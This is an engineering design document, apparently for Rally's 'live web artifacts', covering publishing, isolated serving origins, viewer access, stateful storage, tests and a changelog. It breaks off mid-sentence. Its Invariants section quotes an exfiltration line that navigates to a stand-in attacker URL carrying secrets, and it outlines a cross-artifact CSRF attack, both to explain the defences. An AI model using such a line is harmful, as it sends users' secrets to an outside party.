# Live web artifacts

A **live artifact** is a directory a work-stream run published that Rally also
*serves publicly*, at a stable per-artifact HTTPS origin. A landing page, a
dashboard, a calculator, a poll: the model
writes ordinary files in the Terminal sandbox exactly as it writes a document,
publishes the directory with the same tool, and what lands in the rail is a page
people open rather than a code listing.

Read this before changing anything that publishes a directory, serves an artifact
origin, or touches the facet that holds a stateful artifact's data. The
reasoning behind the design is in
[the PRD](PRDs/2026-08-29_live-web-artifacts/prd.md); this document is what
exists.

## Where the code lives

| Path | Responsibility |
| --- | --- |
| `packages/contracts/src/artifacts.ts` | The shapes both sides agree on: the manifest schema, the site MIME type, the hostname derivation, the asset and isolate keys, the viewer header names. Parsed on both sides rather than trusted across. |
| `apps/api/src/services/terminal/site-publish.ts` | What a published directory *becomes* — the entry-file rule, the stateful-class check, the content-type table, the zip bundler, and the one asymmetric kind transition. |
| `apps/api/src/services/terminal/site-import.ts` | Reading a version's files back out of the bucket, and the whole-tree replacement that writes them — never a merge. |
| `apps/api/src/services/terminal/site-resource-bridge.ts` | Writing one version: assets and manifest into the bucket, the registry row, the supervisor's pointer. The order is the contract. |
| `apps/api/src/services/artifact-hostname.ts` | Reserving a readable four-word hostname in shared platform D1 with permanent collision tombstones. |
| `packages/db/platform-migrations/` | The content-free, platform-shared D1 schema used by both product regions and both artifact Workers. |
| `apps/api/src/services/terminal/runtime.ts` | `inspectPublishTarget` (what a path is) and `publishDirectory` (reading the tree and dispatching). |
| `apps/api/src/durable-objects/artifact-host-do.ts` | One supervisor object per artifact: version pointer, viewer sessions, error log, and the facet that runs the model's storage class. |
| `apps/api/src/artifacts/index.ts` | The artifact serving Worker's entry point — a second Worker, its own origin, its own bindings. |
| `apps/api/src/artifacts/serving-policy.ts` | The three fences: the page CSP, the fetch-metadata admission, and the prior-version mount rules. |
| `apps/api/src/artifacts/read-only-sql.ts` | What a data query may run, and how a dynamic table name is admitted. |
| `apps/api/src/artifacts/facet-host.ts` | The Rally-authored module source loaded into a stateful artifact's facet beside the model's own. |
| `apps/api/src/artifacts/asset-loopback.ts` | `ArtifactAssetLoopback`: the `ASSETS` binding, as an exported entrypoint. The one thing that crosses into an artifact's isolate. |
| `apps/api/src/artifacts/asset-shim.ts` | The two module sources that run inside the isolate: the wrapper that makes `fetch(string)` true, and the entry Rally puts in front of a stateless active site's own module. |
| `apps/api/src/artifacts/pages.ts` | The neutral page, the plain error page, and the fragment-to-cookie bootstrap. |
| `apps/api/wrangler.artifacts.{global,eu}.jsonc` | The serving Workers: wildcard route, platform D1 index, cross-script DO binding, loader, bucket. |
| `apps/api/src/services/workstream-artifact-data-tools.ts` | The two read-only data tools' contract: what a model sees, and which sites are unreachable. No `Env` — its wiring is next door. |
| `apps/api/src/services/workstream-artifact-data-wiring.ts` | Resolving a reference through the standard visibility loader, and reaching the supervisor through the one supported resolver. |
| `packages/agent-harness/src/prompts/document-generation.ts` | The standing policy's `# Sites` section: the trigger and the manners, and nothing else. |
| `packages/agent-harness/src/building-live-sites-skill.ts` | The loadable skill that carries the build craft, scoped to the Terminal plugin. |
| `apps/api/src/services/artifact-open-service.ts` | The identity-bearing door into an artifact origin: the open-time visibility check and the fragment-carrying URL it mints. Public reads bypass it and remain anonymous. |
| `apps/desktop/src/renderer/components/site-resource-detail.tsx` | The site detail: the pane it measures and hands over, the actions it puts in its host's header, and the Data view. |
| `apps/desktop/src/main/artifact-viewers.ts` | What the desktop will load into an artifact surface, the preview rectangle's clamp and corner, the shared isolation contract, and the overlay rule. |

## How it works

### Publishing

`terminal_publish_resource` accepts a directory. It gains no parameter for what
to do with one: **the kind is resolved from the directory's root entry**, because
a parameter restating what the files already say is a parameter that can disagree
with them, and the disagreement would be invisible until serve time.

```
root index.js   → active site   (Rally executes it per request)
root index.html → static site   (assets only)
neither         → archive       (one downloadable zip)
```

`index.js` wins over `index.html`, because an active site almost always ships
both — the module routes its own paths and falls through to the page — so the
module's presence is the stronger signal rather than a tie.

The path's shape is asked once, in one command that also enumerates the tree, and
every file is then read and verified against the digest that listing reported. A
file rewritten in between is a producer that has not finished, and publishing
half of one version with half of another would be a site that renders
inconsistently with nothing to point at.

An **archive** rides the ordinary document publish path unchanged: it is one
file's bytes with a zip's mime type, so identity, replay, version capture, and
the rail entry behave exactly as a document's do. A **site** takes its own path,
because almost nothing is shared — its stored content is a manifest rather than
the thing a viewer sees, its bytes go to version-immutable keys, and it has a
supervisor object to point at afterwards.

Every new site version also gets a normalized social preview. Publish reads the
root page's Open Graph, Twitter/X, title, description, and local preview-image
references. An authored local PNG, JPEG, GIF, or WebP is kept with its measured
dimensions. When the page omits usable artwork, Rally writes a deterministic
1200×630 PNG under `.rally/` using the page title and stores its descriptor in
the manifest. This is publish-time work: a crawler request never parses source
metadata, probes an image, or generates a card. `.rally/` is a platform-reserved
directory and authored files there are refused before any version is written.
The bitmap font transliterates accented Latin text and gives titles with no
supported glyphs a stable visible site code; an authored card remains the right
answer for non-Latin branding.

### Revising

A run asked to change a site it did not build — or built in a session that has
since ended — brings the files back first. The manifest is the index, and
`index.js` is materialized alongside the assets even though a viewer's request
for it 404s: "module, not asset" is a rule about the *serving* path, and a model
that could not see its own server could not revise it.

`overwrite` is **whole-tree replacement, never a merge**. Merging would leave
behind files a later version deleted, and the next publish would ship them back
as though somebody had restored them on purpose. The tree is staged beside the
destination and moved into place, so a failure partway leaves the previous tree
intact.

The one manifest asset source import deliberately omits is a preview marked
`generated: true`. It is Rally's derived output, not model-authored source;
returning it to the sandbox would make an unchanged import-and-republish look
like a source edit and could duplicate the generated asset. Authored preview
images carry `generated: false` and import normally.

### Serving

The artifact serving Worker is a second entrypoint in `apps/api`, deployed as its
own Worker on its own origin. A public address is
`<four-word-stub>-<region>.rallyusercontent.com`. The Worker reads exactly one
indexed row from the content-free `rally-platform` D1 database to recover the
artifact UUID, then reaches the existing UUID-addressed supervisor. Legacy UUID
hosts keep parsing so an old bookmark remains valid; every newly minted or lazily
migrated URL uses the readable stub.

Fences apply in this order, all before any model-authored code runs:

1. **Host** — not an artifact host, or the wrong region's, answers the neutral
   page.
2. **Fetch metadata** — unsafe requests require exact same-origin metadata.
   `GET` and `HEAD` from anywhere are admitted as anonymous public reads; only
   same-origin requests and genuine top-level navigations may carry Rally
   viewer identity. See [Invariants](#invariants).
3. **Optional viewer session** — when a request is eligible and carries the
   artifact cookie, it is checked against `ArtifactHostDO`, which also confirms
   the viewer still sees the work stream. A missing, expired, or no-longer-visible
   session falls back to the public representation with no identity headers.

Then `/__rally/*` paths are Rally's own (the access bootstrap, the redeem
endpoint, prior-version mounts) and everything else is artifact content: assets
resolved against the manifest for a static site, the loader for a stateless
active one, or the facet for a stateful one.

For successful current-version HTML, the Worker adds the manifest's normalized
canonical, description, Open Graph, and Twitter/X tags after authored tags, so
the page's own values win and Rally fills what is missing. Static injection is
limited to the root `index.html`; a second page keeps its own metadata rather
than receiving the home page's title. Static HTML is already bounded by the
publish ceiling and is rewritten as text; an active handler may stream, so its
response is transformed with `HTMLRewriter` instead of buffered. The preview
URL points at the site's ordinary asset path with an artifact-version query.
That path choice is security-significant: a protected active handler's early
viewer guard still covers the preview image, while a new version gets a
different crawler cache key without adding a Rally route that could bypass
model-authored access control. It also means every active handler must keep the
taught `env.ASSETS.fetch(request)` fallback for the generated image to resolve;
Rally deliberately does not route around a handler that owns access control.
Error pages, redirects, JSON, historical versions, and manifests from before
this field existed are not rewritten.

### Access

Artifact content is public by default. A direct browser, crawler, or unfurler
can `GET` or `HEAD` the stable URL without a Rally session. The Worker reads the
current manifest from `ArtifactHostDO`, strips any inbound cookie and viewer
header before model code runs, and injects no identity. Static sites therefore
cannot be private. Anonymous unsafe methods are refused before model code runs:
public means readable, not anonymously writable.

The four-word hostname is a readable routing label with roughly 30 bits of
combinations, not an access secret. Search crawlers receive
`X-Robots-Tag: noindex`, but that is indexing etiquette rather than a security
boundary; anyone holding or discovering the URL can read the current site.

An author who needs a protected site must publish an **active** site whose
handler checks `x-rally-viewer-id` before every route and before its asset
fallback, returning 401 when the header is absent. Rally injects that header
only after the session flow below succeeds; inbound copies are stripped first.
This makes the handler's check an authorization boundary rather than a
guessable-URL convention. The site-building skill teaches this shape explicitly.

`POST /resources/:id/artifact/open` mints a single-use code against current
work-stream visibility — asked of `WorkstreamDO` rather than inferred, because
that fact lives in its own SQL. A resource that does not exist and one the
caller cannot see produce the same 404, so the endpoint is not an existence
oracle. **The code never travels in a request URL.** The desktop lands on
`/__rally/open#<code>`, where a Rally-served bootstrap page reads
`location.hash` — which a browser never sends to a server — clears it from the
address bar, and `POST`s the code in a request body. The redeem endpoint never
serves artifact content: it consumes the code, sets the cookie, and redirects, so
no artifact document is ever loaded at a location that held the code. This
Rally-authored bootstrap is the only response with
`Referrer-Policy: same-origin`, which keeps Chromium's Origin non-opaque on the
redeem POST; the artifact document reached after redemption returns to
`no-referrer`.

The lazy move from a legacy UUID host to a readable host is an origin change.
Server-side facet data is unaffected, but browser-owned cookies, local storage,
and IndexedDB under the legacy origin are not copied to the readable origin and
become unreachable from later opens. Artifacts currently use Rally's server-side
data surface for durable state, so preserving that browser-local state was not
worth retaining UUID origins for newly opened sessions.

### Stateful artifacts

A site whose `index.js` exports `class SiteData extends DurableObject` gets its
own isolated SQLite database, run as a **Durable Object facet** of its supervisor.
Rally assembles the dynamic worker's `modules` map, so the facet never loads the
model's class directly: a Rally-authored module imports `SiteData` and runs a host
class that **instantiates it and holds it as a field**, passing the same `ctx`.
Both objects address one database while living on separate prototype chains, so
the host answers RPCs the model's code never defined — describe, query, page —
over the same rows the page reads and writes.

Requests to a stateful artifact route *through* the supervisor rather than being
served in the loader's own isolate. That is a platform constraint rather than a
preference: facet stubs cannot travel over RPC, so the object that owns the facet
is the only place that can forward into it.

## Invariants

- **The access bootstrap is the only response that may depart from
  `Referrer-Policy: no-referrer`, and it may widen only to `same-origin`.** Its
  native same-origin form POST otherwise carries `Origin: null` and cannot pass
  the redeem fence. The exception must never reach model-authored content or a
  policy that sends an artifact origin off-origin.
- **Model-authored content is never same-origin with the application, the API, or
  another artifact.** Break it and a hostile artifact reads another's storage,
  cookies, or DOM. The origin is a per-artifact subdomain of a registrable domain
  that is not `rallywith.ai`.
- **Separate origins do not close cross-artifact CSRF, so the serving Worker
  separates public reads from credentialed requests.** Every artifact is a
  subdomain of one registrable domain, so two
  artifacts are same-*site*: `SameSite` does not stop script in artifact A
  sending a credentialed request to artifact B, and a simple `POST` needs no
  preflight, so B's model-written handler would still run. Unsafe requests are
  admitted only when fetch metadata says `same-origin`. A top-level document
  navigation — `Sec-Fetch-Mode: navigate` with `Sec-Fetch-Dest: document`, on a
  `GET` — may also use a valid viewer session. **`Sec-Fetch-Site: none` is the wrong
  test** and was the first thing written here: it covers an address bar and a
  bookmark, but a link click or a redirect from anywhere else sends
  `cross-site`, so keying on it would refuse the ordinary act of following a
  link to an artifact. Classifying on what the request is keeps the boundary
  intact, because a document navigation cannot carry a body a page composed.
  Cross-origin, same-site, and metadata-free `GET`/`HEAD` requests are allowed
  only as anonymous public reads: their cookies are ignored and model code gets
  no viewer headers. That distinction is load-bearing; treating a cross-site
  read as an identified viewer would restore the sibling-artifact attack.
- **The CSP's `script-src` and `style-src` must stay written out.** `'self'`
  does not permit inline code, so inheriting `default-src` would refuse the
  inline `<script>` and `<style>` model-authored pages are built from and break
  every artifact on its first load. The egress directives (`default-src`,
  `connect-src`, `form-action`) must never gain `'unsafe-inline'` — egress is the
  threat this policy exists for.
- **Artifact code sees no credential and no network.** The viewer cookie is
  stripped before the request crosses into the module, and `globalOutbound: null`
  makes `fetch()` throw.
- **The viewer identity headers are stripped before they are set**, canonical and
  superseded spellings alike. That strip is the entire anti-spoof mechanism; a
  header family whose readers widen to a legacy prefix and whose stripper does
  not has a forgeable back door.
- **Anonymous access is read-only.** Fetch metadata protects browsers from
  sibling-artifact CSRF; it does not authenticate a non-browser caller, which
  can spell those headers itself. `GET` and `HEAD` may fall back to the public
  representation, while every unsafe method still requires a valid Rally
  viewer session.
- **The renderer never embeds, fetches, or parses artifact content.** An
  `<iframe>` would widen the renderer's CSP to a wildcard artifact host and graft
  remote model-authored content into the application DOM as a navigable,
  `postMessage`-reachable child. The main process owns both viewing surfaces and
  composites the preview over the rail; the renderer can only *ask for an
  artifact*, and the URL it supplies is checked here against the serving domain
  on a label boundary before anything loads.
- **The pane distinguishes "not attempted" from "refused".** A boolean cannot,
  and the gap between access arriving and the main process answering is not a
  failure — a component that used one flashes an unavailable message on every
  open of a page that is about to work.
- **A preview presentation cannot outlive the detail that requested it.** The
  navigation-specific access mint crosses the API and can settle after a work-
  stream switch has unmounted the detail. A cancelled detail must refuse to
  call the main process after cleanup, or it recreates an ownerless old preview
  over the newly selected stream. The presentation's artifact ID and open URL
  must also come from that same navigation mint: the ID selects its isolated
  storage partition while the URL selects its confined origin.
- **Everything the renderer measures is a request, not an instruction.** The
  preview rectangle is clamped to the window, because a wrong or hostile one
  would paint artifact content over the chrome a person needs to escape it. And
  a `WebContentsView` composites *above* the renderer's DOM, so any app surface
  that can overlap the rail — a dialog, the command palette, a lightbox — must
  collapse the view to nothing while it is open, or artifact content paints over
  it.
- **No artifact may register a service worker.** `worker-src 'none'` is written
  out because `default-src 'self'` would permit a same-origin one, and a
  root-scoped service worker is the single thing an artifact can install that
  answers requests without reaching Rally at all — defeating revocation, the
  current-version guarantee, and the offline message in one move.
- **Nothing an artifact composes is handed to the system browser.** An
  off-origin navigation is refused, not opened externally: `location = "https://
  attacker/?" + secrets` is a navigation, which `connect-src` and `form-action`
  do not touch, and opening it would make Rally perform the exfiltration the
  egress fence exists to prevent. **In a plain browser tab that channel stays
  open**, and no header closes it — CSP has no directive over where a document
  navigates itself. So the egress fence is honestly two claims, not one: no
  artifact can *fetch, load, beacon, or post* off-origin anywhere, and in
  Rally's own surfaces it cannot navigate off-origin either. A page opened in
  a browser can still put what it can see into a URL bar the person watches it
  land in — which is the reason the desktop refuses rather than hands off, and
  the reason this is written down rather than left as an assumed property of
  the CSP.
- **The asset manifest is the only index.** Nothing resolves a path the manifest
  does not name, which is what makes the server module's absence from `assets` a
  real 404 rather than a convention.
- **A version's bytes are immutable.** The loader caches an isolate by a
  version-scoped id, so publishing different content at a version already used
  serves the cached module. A republish always advances the version.
- **Assets, then manifest, then hostname reservation, then resource row, then
  pointer.** Each step depends only on ones that already committed, so a failure
  leaves the artifact serving its *previous* version rather than a version whose
  bytes a viewer cannot read. The hostname must be reserved before the resource
  row moves: otherwise a D1 failure followed by an equal-content retry can
  mistake the changed resource for a completed publish and return the old
  artifact version.
- **A republish never downgrades a live site to an archive.** Archive→site
  upgrades freely — that is the archive fallback's own recovery — but the
  reverse fails loudly, because a URL participants hold is never killed by an
  accident of file layout.
- **`artifact_registry` is not the region-wide uniqueness authority.** It
  lives in a per-workspace database, so a `UNIQUE` there is unique per workspace
  and two workspaces could claim one host. The shared platform D1 composite
  primary key reserves `(region, hostname_stub)`; an immutable trigger and a
  no-delete trigger make old origins permanent tombstones.
- **A data query is admitted positively, never by denylist.** An always-rollback
  transaction is not an authorization boundary: caller SQL can commit
  mid-statement. Exactly one statement, parsing as a `SELECT`, with a `WITH`
  clause's *body* checked rather than its opening keyword.
- **A dynamic table name is matched against the live schema, never interpolated.**
  The names are the model's, so no code-owned allowlist can exist; the list is
  read from the facet's own `sqlite_master` at request time.

## Boundary

This module owns publishing a directory, serving an artifact origin, and the
facet that holds a stateful artifact's data. It does not own:

- **Resource identity, versioning, or the rail's resource list.** A site is an
  ordinary resource row; [`agent-attachments.md`](agent-attachments.md) and the
  versioning layer own those, and this module adds a resource type and an
  attachment kind to them.
- **Work-stream visibility.** It is not a D1 fact and never travels on the
  revocation queue — `WorkstreamDO` answers it, and the supervisor asks.
  [`access-revocation.md`](access-revocation.md) owns why those two mechanisms
  must never be merged.
- **The Terminal sandbox.** [`terminal-workspaces.md`](terminal-workspaces.md)
  owns the sandbox boundary; this module only reads files out of it.
- **Durable Object addressing rules.** `lib/durable-object-namespace.ts` is the
  one supported resolver; this module added `durableObjectStubForArtifact` to it
  rather than routing raw.

## Failure modes and limits

- **The loader binding is absent.** A static artifact still serves. A stateless
  active artifact fails closed with 503 because its handler may be the access
  control protecting those same assets; serving the files as a fallback would
  turn a runtime outage into a privacy breach. A stateful site runs through its
  supervisor facet and does not need this binding on the serving Worker.
- **The model's module throws.** The viewer gets a plain Rally page, never a
  stack trace. The error — message, stack, request path — lands in a bounded
  per-artifact log (50 entries), which no client surface currently reads (see
  the changelog entry for 2026-09-10), so recovering it means asking for it
  back into chat.
- **A viewer loses work-stream visibility.** Their next eligible request loses
  its Rally identity and receives the anonymous public representation. A
  protected active site's own early header guard then returns 401; a public site
  continues serving it. `VISIBILITY_CACHE_MS` bounds how long a removed viewer
  may still receive identity and **ships at the open value of zero** — every
  request re-asks `WorkstreamDO` — because that security window is the team's
  number to set rather than this code's to guess.
- **Viewer identity cannot be checked.** Identity is an optional enhancement to
  public serving, so a failed visibility hop falls back to the anonymous
  representation rather than making a browser with an old cookie less able to
  read than a crawler. The failure emits a structured warning; a protected
  active site's header guard still refuses the anonymous request.
- **An anonymous request makes the model handler throw.** It receives the same
  neutral 500 response, but cannot append to the participant-facing error ring:
  otherwise crafted public requests could evict every useful diagnosis and
  plant attacker-controlled paths in a surface participants paste into chat.
  Reproducing the failure through Rally records it with trusted viewer context.
- **A prior version of a stateful artifact.** Source only, never live: one facet
  runs one class, so serving old code would abort the facet under current
  viewers, and old code against a live schema is undefined besides.
- **A prior version mount.** Unsafe methods are refused at the request path,
  and a prior version renders its **frozen assets only** — its module is never
  loaded. That is not caution but the removal of a class: a root-absolute
  `fetch("/api/…")` from a historical render is an ordinary same-origin request
  to the canonical path, and `Referrer-Policy: no-referrer` leaves nothing to
  tell it apart from one the current page made, so the escape cannot be closed
  at the request path. What remains is a page whose client script may read the
  current version's data — a wrong reading rather than an unauthorized one.
- **The window goes before the preview does.** A rail preview is a
  `WebContentsView` in a window Electron can destroy at any moment — quitting to
  install an update is the ordinary way — and the teardown that follows runs
  from that window's own `closed` event, after the view tree is already gone.
  Both surfaces are therefore asked whether they still exist before they are
  detached or closed; the window and the view are asked separately, because a
  view whose contents closed themselves is still attached to a live window.
- **Numeric limits.** Viewer session lifetime is 24 hours, fixed from mint and
  never sliding — the shape, not just the number, is the sleep guarantee, since
  compute per open is bounded by rate ceiling × lifetime. The open code lives 60
  seconds. A publish carries at most 25,000,000 bytes, transcribed from the file
  path's existing bound rather than chosen. A data page returns at most 200 rows.

## Testing

| Suite | What it proves |
| --- | --- |
| `pnpm --filter @rally/api exec vitest run test/artifact-read-only-sql.test.ts` | The SQL admission, adversarially: statement sequences that commit mid-payload, CTEs wrapping writes, semicolons inside literals, writes behind comment markers, and identifier injection. |
| `pnpm --filter @rally/api exec vitest run test/artifact-serving-policy.test.ts test/artifact-serving-hostname.test.ts` | The three fences: CSP directives, anonymous public reads, session identity only on eligible requests, refusal of credentialed cross-artifact writes, version-mount parsing, and asset resolution. |
| `pnpm --filter @rally/api exec vitest run test/site-social-preview.test.ts test/artifact-social-preview.test.ts` | Publish-time metadata extraction, authored local artwork, fallback PNG generation, absolute crawler metadata, escaping, and canonical URL cleanup. |
| `pnpm --filter @rally/api exec vitest run test/terminal-site-publish.test.ts` | Kind resolution, the one-file refusal, the storage-class check, content types, the zip, and the asymmetric transition. |
| `pnpm --filter @rally/api exec vitest run test/terminal-runtime.test.ts` | Directory publish end to end through the runtime, against a simulated sandbox shell. |
| `pnpm --filter @rally/api exec vitest run test/artifact-open-service.test.ts` | Which authority answers which question at open time, that a refusal mints nothing, and that a missing artifact and an invisible one are indistinguishable. |
| `pnpm --filter @rally/desktop exec vitest run src/renderer/components/site-resource-detail.test.tsx` | The detail: that it measures and hands over rather than embedding, that its actions land in the host's header and each carries a tooltip, that Copy link carries no code, that the data toggle only exists for a site that keeps data and takes the composited view down with it, and that the pane never flashes its unavailable state. |
| `pnpm --filter @rally/desktop exec vitest run src/main/artifact-viewers.test.ts` | What the desktop will load, the rectangle clamp, the isolation contract, the overlay collapse, and the teardown guards — each surface's lifecycle branch separately, since one guard covering both reads as covered while half of it is dead. |
| `pnpm --filter @rally/desktop exec vitest run src/main/artifact-preview-wiring.test.ts` | The per-window registry in `index.ts`, which the controller's own suite cannot see: one controller and so one `closed` listener per window, the entry removed only by that listener, and the adapter reporting lifecycle rather than assuming it. |
| `pnpm --filter @rally/api exec vitest run test/workstream-artifact-data-tools.test.ts` | The data tools' contract and the site read-remediation, including its round trip through the real structured-failure sanitizer. |
| `pnpm --filter @rally/agent-harness exec vitest run` | The skill's shape and the standing policy's byte budget — the prompt bound is what keeps the policy six lines rather than nine. |
| `pnpm --filter @rally/api exec vitest run --config vitest.workers.config.ts test-workers/artifact-stateless-module.test.ts` | A **stateless active** site's isolate on real workerd: that the `ASSETS` stub crosses the loader's env at all, that it serves this artifact's files, that the relative-string read works, and that `fetch()` throws. Scope is the isolate contract, not admission — the fences in front of it are the policy suite's. |
| `pnpm --filter @rally/api exec vitest run --config vitest.workers.config.ts test-workers/artifact-social-preview-runtime.test.ts` | `HTMLRewriter` on real workerd: active HTML receives metadata without buffering, while protected errors and JSON remain exact. |
| `pnpm --filter @rally/api test:workers` (`test-workers/artifact-facet.test.ts`) | The facet on **real workerd**: a model class running with its own SQLite, viewer attribution and deduplication, rows surviving a republish, isolation between two artifacts and from the supervisor's own tables, egress throwing, and the rollback. |

Two traps:

- **Never publish different source at a version another test used.** The loader
  caches by a version-scoped isolate id, so the second publish silently serves
  the first's module and the failure reads as a missing route. `publish()` in the
  facet suite allocates versions for exactly this reason.
- **The supervisor's defensive `facets.abort` cannot be shown load-bearing
  locally.** Removing it leaves the workerd proofs passing, because the runtime
  reloads a facet whose class identity changed. It stays because it is the
  documented lifecycle and guards a cold-tracking case a single-process test does
  not reach — do not delete it on the strength of a green suite.

## Data model

- `resources` gains `resource_type = 'generated_site'`, provider
  `avalon_generated`, and the same `terminal:<workstream>:<path>` identity file
  publishes use. Its `content_ref` points at the version's **manifest**, so its
  MIME type is `application/vnd.rally.site-manifest+json`.
- `artifact_registry` (WorkspaceDO, migrations 28–29): `artifact_id` (the
  supervisor/storage UUID), `hostname_stub`, `workspace_id`, `workstream_id`,
  `resource_id`, `mode`, `stateful`, `current_version`, `manifest_ref`, timestamps.
- Shared platform D1 `artifact_hostname_routes`: `region`, `hostname_stub`,
  `artifact_id`, `created_at`. It contains no workspace, user, session, or
  artifact content.
- `ArtifactHostDO` (both regions, jurisdiction-pinned): `artifact_state` (one
  row), `viewer_sessions` (digests only — the cookie value is never stored), and
  `error_log` (a bounded ring).
- The `"data"` facet, for stateful artifacts: the model's schema, in a database
  that rides the supervisor's storage envelope. Facet classes are dynamic and
  never appear in Wrangler migrations; only `ArtifactHostDO` does.
- R2 `PAYLOADS`: `artifact/<id>/v<n>/assets/<path>` and `…/manifest.json`.
  New manifests optionally carry a `socialPreview` descriptor; generated cards
  are ordinary versioned assets beneath that same prefix.

## Regional impact

Serving content is region-distinct end to end. The two wildcard hosts route to their own
region's Worker (`*-g` and `*-eu`), so an EU artifact's bytes never transit a
Global Worker and no cross-region bridge is added. An artifact's assets,
manifest, stored data, sessions, and error log all rest in its workspace's
region. Only the opaque stub-to-artifact-UUID row is platform-shared; it carries
no content or participant identity. The EU half is deployed dark and accepts no
traffic until EU Terminal ships, because nothing can publish an EU artifact
before then.

## Security and trust model

The trust surface is the point of this module, and
[`security.md`](security.md) owns the boundaries it sits on. In short: artifact
code is untrusted and capability-fenced (one injected binding, no network, no
secrets, no Rally bindings); artifact *data* is untrusted content with a trusted
container, since the rows were written by model code and page visitors while the
host class that reads them is Rally's and cannot be shadowed; and the serving
Worker's waistline is deliberately minimal. Artifact content is intentionally
public unless its active handler requires the trusted viewer header; error logs,
data tools, publication, and revision remain work-stream-authorized. A
compromise of the serving Worker exposes artifact content and viewer sessions
rather than workspace authority.

## Changelog

### 2026-09-10 — The page is the whole surface, and its controls are the header's

**What changed:** The detail no longer draws a panel switch, a kind line, or a
row of actions. Its four controls (stored data, pop out, copy public link, open
in browser) are icon buttons portalled into whatever header the host is already
drawing, through a slot the rail now offers any detail. Stored data is a toggle
that replaces the page rather than a peer of it, and the pane is full bleed: no
border, no corner, no gutter, flush to the lightbox's own edges. The error log
is gone from the client; `PREVIEW_CORNER_RADIUS` now mirrors the lightbox's
radius rather than the pane's, since the pane no longer has one.

**Why:** Everything Rally drew around the page was a second frame inside the
lightbox's, and everything it drew above the page competed with content the
model authored. A live artifact is the one resource whose detail *is* the thing
itself, so the chrome belongs where the surface already keeps chrome. Two
defects only visible in a window came out of it: an icon-only action is
unreadable without its tooltip, and every tooltip in this lightbox was opening
behind it at `z-index: 1000` against the lightbox's 1001, so they were present
in the DOM, findable by a test, and invisible to anyone hovering. The data
toggle also had no pressed state, because `.icon-button` had never had one.

**Considered and rejected:** Hoisting the detail's state into the rail so the
rail could draw the buttons itself, which spreads one detail's logic across two
components and grows the rail by a branch per kind of resource. The slot gives
the rail one capability and no knowledge of any detail. Also rejected: keeping
the error log behind the new toggle, which is the panel-among-panels shape this
change exists to remove.

**Consequences:** **A site's thrown errors are no longer visible anywhere in the
client.** The supervisor still records them and `GET` still serves them; nothing
reads it. Bringing them back should not restore a permanent tab: the surface
that fits is one that appears only when the log is non-empty. A detail that
wants header actions must be rendered inside `DetailHeaderActionsHost`, and a
host that forgets the slot silently gets no actions rather than a fallback
layout. The view's corner is now pinned to the lightbox's radius, so restyling
that dialog means moving the constant with it.

### 2026-09-10 — The site detail wears the shell's design, and the view is rounded

**What changed and why:** The detail drew the pre-rewrite look because it
renders through a portal, where none of the shell's scoped rules apply: a tab
strip of outlined buttons, a bordered card per thrown error, and its own copy of
the resource title under the header that already carried it. It now uses the two
unscoped primitives (`SegmentedControl`, `InsetSurface`/`InsetList`), carries no
title of its own, and puts Pop out, Copy public link, and Open in browser in one
chrome row beside the panel switch instead of a row of buttons under the page,
where they read as part of the artifact rather than as Rally's. The pane takes
the whole lightbox body rather than ending halfway down it.

`ArtifactViewHandle` gained `setBorderRadius`, applied once at creation with
`PREVIEW_CORNER_RADIUS`. A `WebContentsView` composites above the DOM and CSS
cannot clip it, so the rounded pane was drawing its own corners around a square
page. The corner is set on the view rather than sent with the bounds because
bounds are recomputed on every scroll frame and the corner is a property of the
surface, not of a layout.

**Consequences:** The number lives in two places that cannot import each other,
the main process and a design token, so `app.css.node.test.ts` pins them
together; moving one alone fails there rather than showing up as a hairline
around a page. The panel switch is a group of toggles, not a tab list, so a test
that queries it by `role="tab"` is querying something this detail no longer
claims to be.

### 2026-09-04 — Host site details in the resource lightbox

**What changed and why:** Parking the right sidebar must not send generated-site
manifests through file conversion. Citation and artifact clicks now open the
same dedicated SiteResourceDetail in a lightbox, preserving the native isolated
viewer, fresh access codes, data, logs, and pop-out behavior. File conversion is
not a fallback for a site. Nested dialogs/menus hide the native preview; closing
them restores its clipped viewport. Route changes tear it down.

**Consequences:** The viewer still owns no shell rail. Earlier references below
to the rail describe its original host, not a current navigation entry point.

### 2026-09-02 — Preview teardown asks whether its surfaces still exist

**What changed:** `ArtifactViewHandle` and `ArtifactHostWindow` gained a
`destroyed()` predicate, and `ArtifactPreviewController` consults it before
detaching, closing, laying out, or presenting.

**Why:** Quitting with an artifact open in the rail crashed the app instead of
quitting it. `electron-updater` closes every window to install; the window's
`closed` handler then tore the preview down, and reading `contentView` off a
window Electron had already destroyed threw `TypeError: Object has been
destroyed` from inside an event handler — which the main process reports as an
uncaught exception dialog. The teardown was correct about *what* to clean up and
wrong about *when* it was still possible.

**Considered and rejected:** Tearing down on `close` instead of `closed`, which
would run while the window still exists — but `close` is cancellable and can
fire more than once, so the preview would be destroyed under a person who then
kept the window. Wrapping the teardown in `try`/`catch` would hide the same
class of ordering bug everywhere else it occurs. Guarding inside the Electron
adapter in `index.ts` would have worked and been untestable: this module holds
no `electron` import precisely so its decisions can be unit tested, and *when a
surface may be touched* is a decision.

**Also:** `present()` discards a view whose contents closed themselves before
deciding whether to reuse it. Reuse was keyed on the artifact ID alone, so a
page that called `window.close()` left a dead handle that the next presentation
of the same artifact would keep — compositing nothing while reporting success,
which the rail reads as a live preview and so renders no fallback over the blank
pane. Found by review.

**On the tests:** a disjunctive lifetime check reads as covered while half of
it is dead, so each half is falsified separately where it can be. In `destroy()`
both halves are load-bearing — they gate different actions on objects that die
independently — and each has its own test. In `applyBounds()` only the view half
is falsifiable: Electron destroys a window's views with it, so a destroyed
window implies a destroyed view and the window half can never be the one that
returns. It is kept as the statement of what `contentSize()` needs, not as
tested behaviour. Both gaps came out of review; the first round shipped one
combined test and claimed more than it proved.

**Consequences:** The lifecycle is now part of the two interfaces, so any future
host or view implementation has to answer for it. A destroyed window is asked to
detach nothing, because destroying it already destroyed its children; the view
is asked separately, so one that closed itself is still detached from the live
window holding it. Closing the preview over IPC also stops dropping the
controller from the per-window map, which was adding a second `closed` listener
to the same window on every subsequent presentation.

### 2026-09-02 — A cancelled detail cannot resurrect its preview

**What changed:** The live-site detail now checks its ownership again after a
navigation access mint settles and before asking Electron to present the native
preview. It also carries the artifact ID and URL from the same mint into preview
and pop-out requests. Regression tests hold a mint across unmount to prove no
late presentation and reject an identity/URL pair from different mints.

**Why:** Switching work streams closes the preview while the old detail unmounts,
but minting the preview's single-use access URL is asynchronous. When that mint
finished after cleanup, the continuation still called the main process and
created the old stream's site view with no mounted component left to close it.

**Considered and rejected:** Closing every preview a second time after minting
would still let stale artifact content appear briefly and could close a newer
detail's valid preview. The cancelled owner instead never presents.

**Consequences:** Every asynchronous step before native presentation must keep
